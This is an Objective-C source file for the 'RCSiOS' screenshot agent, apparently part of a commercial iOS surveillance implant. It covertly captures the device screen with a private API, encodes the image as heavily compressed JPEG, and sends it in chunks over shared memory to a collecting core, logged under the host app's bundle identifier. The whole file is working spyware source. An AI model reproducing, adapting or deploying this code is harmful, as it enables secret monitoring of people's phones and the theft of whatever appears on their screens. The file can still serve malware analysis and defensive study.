/*
 * RCSiOS - Screenshot agent
 *
 *
 * Created by Massimo Chiodini on 08/03/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIKit.h>
#import <sys/time.h>

#import "RCSIAgentScreenshot.h"
#import "RCSISharedMemory.h"
#import "RCSICommon.h"
#import "RCSIThreadSupport.h"

//#define DEBUG

#define APP_IN_BACKGROUND 0
#define APP_IN_FOREGROUND 1

typedef struct _screenshot {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows;   // 1 TRUE onNewWindow - 0 FALSE
} screenshotAgentStruct;

typedef struct _screenshotHeader {
	u_int version;
#define LOG_SCREENSHOT_VERSION 2009031201
	u_int processNameLength;
	u_int windowNameLength;
} screenshotAdditionalStruct;

typedef struct CGImageDestination *CGImageDestinationRef;

extern CGImageRef UIGetScreenImage();
extern CGImageDestinationRef CGImageDestinationCreateWithURL(CFURLRef url, CFStringRef type, size_t count, CFDictionaryRef options);
extern void CGImageDestinationAddImage(CGImageDestinationRef idst, CGImageRef image, CFDictionaryRef properties);
extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);

#define SCR_WAIT 1

@implementation agentScreenshot

- (NSDictionary *)getActiveWindowInformation
{
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                                             @"processName",
                                             @"windowName",
                                             nil];
  
  NSArray *objects = [NSArray arrayWithObjects: bundleIdentifier,
                                                bundleIdentifier,
                                                bundleIdentifier,
                                                nil];
  
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  return windowInfo;
}

- (BOOL)_grabScreenshot
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  int                         leftBytesLength = 0,byteIndex = 0;
  long                        logID;
  struct timeval              tp;
  time_t                      logTime;
  CGImageRef                  screenShot;
  NSString                    *processName;
  NSString                    *windowName;
  NSMutableData               *logData;
  shMemoryLog                 *shMemoryHeader;
  screenshotAdditionalStruct  *agentAdditionalHeader;
  int chunck_id = 0;

  // Fix for iOS: background apps will crash if 
  // trying to grab a shot
  UIApplication *uiApp = [UIApplication sharedApplication];
  
  if (uiApp != nil) 
    {
      UIWindow *keyW = [uiApp keyWindow];
      if (keyW == nil)
        {
          [self setMAgentStatus: AGENT_STATUS_STOPPED];
          [pool release];
          return NO;
        }
    }
  else 
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [pool release];
      return NO;
    }
  
  // try grabbing: if app is going in bg catch exception
  @try {
    // Run the screenshot
    screenShot = UIGetScreenImage();
  }  
  @catch (NSException *e) 
  {
    [self setMAgentStatus: AGENT_STATUS_STOPPED];
    [pool release];
    return FALSE;
  }
  
  if (screenShot == NULL)
    return NO;
  
  UIImage *imgScr = [UIImage imageWithCGImage: screenShot];
  
  CGImageRelease(screenShot);
  
  if (imgScr == nil)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [pool release];
      return NO;
    }
  
  // highest compression
  NSData *entryData = UIImageJPEGRepresentation(imgScr, 0.00);
  
  // JPEG screenshot image data...
  if (entryData == nil) 
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [pool release];
      return NO;
    }
  
  // Log id creating
  ctime(&logTime);
  logID       = getpid() ^ logTime;
  processName = [[NSBundle mainBundle] bundleIdentifier];
  windowName  = [[NSBundle mainBundle] bundleIdentifier];
  chunck_id = 0;

  // Fill in the agent additional header
  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc] initWithLength: sizeof(screenshotAdditionalStruct) +
                                        [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                        [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  agentAdditionalHeader->windowNameLength  = windowNameLength;
  
  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  logData         = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryHeader  = (shMemoryLog *)[logData bytes];
  
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = logID;
  shMemoryHeader->agentID         = LOG_SNAPSHOT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
  shMemoryHeader->flag            = chunck_id++;
  shMemoryHeader->commandDataSize = [rawAdditionalHeader length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [rawAdditionalHeader bytes],
         [rawAdditionalHeader length]);
  
  [rawAdditionalHeader release];
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
  
  [logData release];
  
  int entryDatalen = [entryData length];
  
  do 
    {
    // timing for producer/consumer
    usleep(250000);
    
    logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
    shMemoryHeader = (shMemoryLog *)[logData bytes];
    
    leftBytesLength = ((entryDatalen - byteIndex >= 0x300)
                       ? 0x300
                       : (entryDatalen - byteIndex));
    
    memcpy(shMemoryHeader->commandData,
           [entryData bytes] + byteIndex,
           leftBytesLength);
    
    byteIndex += leftBytesLength;
    
    // Last block writing...
    if (byteIndex >= [entryData length])
      shMemoryHeader->commandType   = CM_CLOSE_LOG;
    else
      shMemoryHeader->commandType   = CM_LOG_DATA;
    
    gettimeofday(&tp, NULL);
    
    shMemoryHeader->status          = SHMEM_WRITTEN;
    shMemoryHeader->logID           = logID;
    shMemoryHeader->agentID         = LOG_SNAPSHOT;
    shMemoryHeader->direction       = D_TO_CORE;
    shMemoryHeader->flag            = chunck_id++;
    shMemoryHeader->commandDataSize = leftBytesLength;    
    shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
    
    
    [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
    
    [logData release];
    
  } while (byteIndex < entryDatalen);
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [pool release];
  
  return YES;
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    mAgentID = AGENT_SCREENSHOT;
  
  return self;
}

- (BOOL)start
{
  BOOL retVal = TRUE;
  
  if ([self mAgentStatus] == AGENT_STATUS_STOPPED)
    {
      [self setMAgentStatus: AGENT_STATUS_RUNNING];
    
      _i_Thread *agentThread = [[_i_Thread alloc] initWithTarget: self
                                                          selector: @selector(_grabScreenshot) 
                                                            object: nil
                                                           andName: @"scrsht"];
      
      [self setMThread: agentThread];
      
      [agentThread start];
      
      [agentThread release];
    }
  
  return retVal;
}

- (void)stop
{
  
}

@end